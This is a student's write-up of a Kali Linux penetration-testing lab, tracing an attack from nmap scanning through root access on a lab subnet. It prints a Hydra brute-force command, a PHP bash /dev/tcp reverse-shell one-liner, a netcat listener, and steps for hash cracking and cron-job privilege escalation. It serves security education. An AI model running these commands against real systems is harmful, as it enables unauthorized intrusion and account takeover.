# Kali Linux Penetration Testing Lab

This project demonstrates a structured penetration testing exercise performed in a controlled virtual lab environment using Kali Linux.

The objective was to simulate a real-world attack chain, starting from reconnaissance and progressing through multiple exploitation stages until full root access was obtained.

The lab environment consisted of:

- Kali Linux attacker machine
- Vulnerable Linux target machine
- Internal subnet environment

## Lab Environment

Attacker Machine:
Kali Linux running in an Azure Virtual Machine

Target Machine:
Vulnerable Linux web server

Network:
192.168.0.0/24 subnet

Example IP addresses used in the lab:

Attacker: 192.168.0.102  
Target: 192.168.0.100

## Attack Phases

### Phase 1 – Reconnaissance

Tools used:

- Nmap

Commands used:
ip a
nmap 192.168.0.0/24 -sP
nmap -sV 192.168.0.100


This phase identified:

- Active hosts
- Running services
- Open ports

The target system exposed:

- SSH (port 22)
- Apache web server (port 80)

### Phase 2 – Web Login Brute Force

Tools used:

- Burp Suite
- Hydra

Hydra command:
hydra -L usernames.txt -P passwords.txt 192.168.0.100
http-post-form "/login.php:username=^USER^&password=^PASS^&login=:Wrong username or password"

Result:

Default credentials were discovered:
administrator : administrator

This vulnerability occurred due to:

- weak default credentials
- no rate limiting
- no account lockout
- no multi-factor authentication

### Phase 3 – File Upload Exploit

A PHP reverse shell was created to gain command execution on the target server.

Example reverse shell:
system("bash -c "bash -i >& /dev/tcp/$ip/$port 0>&1"");

A polyglot file technique was used to bypass upload restrictions:
image.jpg.php

Listener started on Kali:
nc -lvnp 4444

This successfully produced a reverse shell as user:
www-data

### Phase 4 – Password Hash Cracking

An Apache `.htpasswd` file was discovered containing password hashes.

Hash cracking was performed using **John the Ripper**:


john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt


This revealed the developer account password.

### Phase 5 – Credential Exposure

Inspection of `.bash_history` files revealed stored plaintext credentials.

This allowed SSH access to another user account.

Security issue:

Storing credentials in command history exposes sensitive information to attackers.

### Phase 6 – Privilege Escalation via Cronjob

A scheduled cron job running as root executed a script that was writable by a normal user.

By modifying the script to include a reverse shell, root access was obtained.

## Security Lessons

This lab demonstrates several critical security mistakes:

- weak authentication policies
- insecure file upload handling
- exposed password hashes
- credential leakage
- misconfigured cronjobs
- improper privilege separation

## Tools Used

- Kali Linux
- Nmap
- Hydra
- Burp Suite
- Netcat
- John the Ripper
- SSH

---

## Learning Outcomes

This exercise demonstrates the full lifecycle of a penetration test:

Reconnaissance → Exploitation → Privilege Escalation → Root Access

It highlights how multiple small vulnerabilities can combine to create a complete system compromise.

## Author

Yoshitha Akurugoda  
Cybersecurity Undergraduate
